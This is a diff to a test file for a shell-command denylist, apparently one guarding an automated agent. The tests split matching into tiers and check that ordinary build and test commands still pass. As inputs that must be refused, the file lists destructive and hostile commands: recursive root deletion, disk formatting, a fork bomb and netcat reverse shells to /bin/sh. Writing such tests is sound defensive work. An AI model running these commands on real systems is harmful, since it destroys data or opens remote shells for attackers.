@@ -61,26 +61,25 @@ describe('tokenizeSafe still refuses what it always refused', () => {
 });
 
 describe('the denylist reads a command, not a mention of one', () => {
-  it('allows a search whose ARGUMENT happens to spell a blocked command', () => {
-    // Tokenizing strips the quotes, so a substring test over the joined argv
-    // finds `chmod 777 /` inside `grep -rn chmod 777 /etc` and refuses a
-    // read-only search. The argv check is anchored at argv[0] to avoid that.
-    expect(commandPolicyViolation('grep -rn "chmod 777" /etc')).toBeNull();
-    expect(commandPolicyViolation('npm test --grep "chmod 777" /tmp')).toBeNull();
+  it('refuses a DISTINCTIVE entry even as an argument, deliberately', () => {
+    // `chmod 777 /` and `rm -rf /` are matched wherever they appear. A command
+    // line containing one is essentially never innocent, and the alternative —
+    // reaching them by parsing the shell — is what this file kept getting
+    // wrong. The cost is a refused `grep` for those exact strings; the benefit
+    // is that no wrapper, flag form or quoting trick has to be anticipated.
+    expect(commandPolicyViolation('grep -rn "chmod 777 /" /etc')).toMatch(/Blocked command detected/);
   });
 
-  it('no longer refuses a command that merely mentions a blocked entry', () => {
-    // The scan used to be a plain substring test, which refused any command
-    // whose text spelled an entry anywhere. Measured on the shipped list, that
-    // meant `nc ` blocked `npm run sync tests`, `go test ./internal/sync` and
-    // `cargo test --features async ui` — ordinary verification commands, all
-    // three. A scorer treats such a refusal as unfixable, so it would have
-    // failed correct children over a command that never ran.
+  it('no longer refuses a command that merely mentions a SHORT entry', () => {
+    // `nc ` is two letters and a space, so as a substring it refused
+    // `npm run sync tests`, `go test ./internal/sync` and
+    // `cargo test --features async ui` — measured, on the shipped list. Short
+    // words are matched in command position only, which is what makes ordinary
+    // verification work possible; a scorer treats such a refusal as unfixable.
     expect(commandPolicyViolation('npm run sync tests')).toBeNull();
     expect(commandPolicyViolation('go test ./internal/sync -run X')).toBeNull();
     expect(commandPolicyViolation('cargo test --features async ui')).toBeNull();
-    expect(commandPolicyViolation('grep -r "rm -rf /" .')).toBeNull();
-    expect(commandPolicyViolation('find . -name mkfs.conf')).toBeNull();
+    expect(commandPolicyViolation('netcatalog list')).toBeNull();
   });
 
   it('still refuses the entry when it IS the command', () => {
@@ -182,12 +181,12 @@ describe('and none of that re-refuses ordinary work', () => {
     'go test ./internal/sync -run X',
     'cargo test --features async ui',
     'npm test',
-    'grep -r "rm -rf /" .',
     'ncdu /var/log',
     'haltcheck --x y',
     'shutdownctl --status',
-    'find . -name mkfs.conf',
     'pytest tests/ -k "sync and not slow"',
+    'npm test -- -c config/halt.json',
+    'gcc -c src/nc.c',
   ])('allows %s', (command) => {
     expect(commandPolicyViolation(command)).toBeNull();
   });
@@ -317,4 +316,81 @@ describe('the matcher is not a denial-of-service surface', () => {
   it('still finds a blocked command nested behind several -c hops', () => {
     expect(commandPolicyViolation('sh -c "sh -c \'rm -rf /\'"')).toMatch(/Blocked command detected/);
   });
+});
+
+/**
+ * The two tiers, and why the split exists.
+ *
+ * A single rule could not serve both halves of the denylist. Matching
+ * everything as a substring refused `npm run sync tests` (the `nc ` entry);
+ * matching everything in command position let `env -u FOO rm -rf /` and
+ * `timeout --signal=KILL 5 rm -rf /` through, because each new flag shape is
+ * another thing the parser has to know about. Distinctive entries are matched
+ * anywhere; short words only where a command starts.
+ */
+describe('tier 1 — distinctive entries, matched anywhere', () => {
+  it.each([
+    'env -u FOO rm -rf /',
+    'timeout --signal=KILL 5 rm -rf /',
+    'xargs -a list rm -rf /',
+    'find . -exec rm -rf / \;',
+    'sh -c "rm -rf /"',
+    'mkfs.ext4 /dev/sda1',
+    'rm -rf //',
+    'rm -rf ~/',
+    ':(){:|:&};:',
+  ])('refuses %s without having to model the flags', (command) => {
+    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
+  });
+});
+
+describe('tier 2 — short words, matched only in command position', () => {
+  it.each([
+    'nohup halt',
+    'nice --adjustment=10 poweroff',
+    'nice -n 5 halt',
+    'sh -c "shutdown -h now"',
+    'nc.openbsd -e /bin/sh 1.1.1.1 22',
+    'ncat.traditional -e /bin/sh',
+    'foo | nc host 1234',
+    'echo hi\nshutdown -h now',
+  ])('refuses %s', (command) => {
+    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
+  });
+
+  it.each([
+    'timeout 60 npm run halt',
+    'env FOO=1 npm run halt',
+    'nohup timeout 5 npm run reboot',
+    'xargs -I {} npm run kill',
+    'npm test -- -c config/halt.json',
+    'gcc -c src/nc.c',
+  ])('allows %s', (command) => {
+    // `-c <path>` is the standard config flag for eslint, jest and pytest, and
+    // through a scorer a wrong refusal here is non-retryable.
+    expect(commandPolicyViolation(command)).toBeNull();
+  });
+});
+
+describe('elevation names a binary, not a script that shares its name', () => {
+  it.each([
+    ['sudo npm i', 'sudo'],
+    ['/usr/bin/sudo x', 'sudo'],
+    ['env A=1 sudo npm i', 'sudo'],
+    ['sh -c "sudo x"', 'sudo'],
+    ['nohup timeout 5 sudo apt update', 'sudo'],
+    ['true && systemctl restart x', 'systemctl'],
+  ])('%s is elevated', (command, expected) => {
+    expect(matchElevatedCommand(command)).toBe(expected);
+  });
+
+  it.each(['./scripts/service.sh', 'bash kill.sh', 'sh halt.sh', 'sh nc.sh', 'env A=1 npm run sudo-check'])(
+    '%s is not',
+    (command) => {
+      // A dot continues a name here, so `kill.sh` is a project script rather
+      // than the `kill` binary — routing it to the DENY-by-default
+      // `execute_elevated` action would refuse ordinary work.
+      expect(matchElevatedCommand(command)).toBeNull();
+    },
+  );
 });
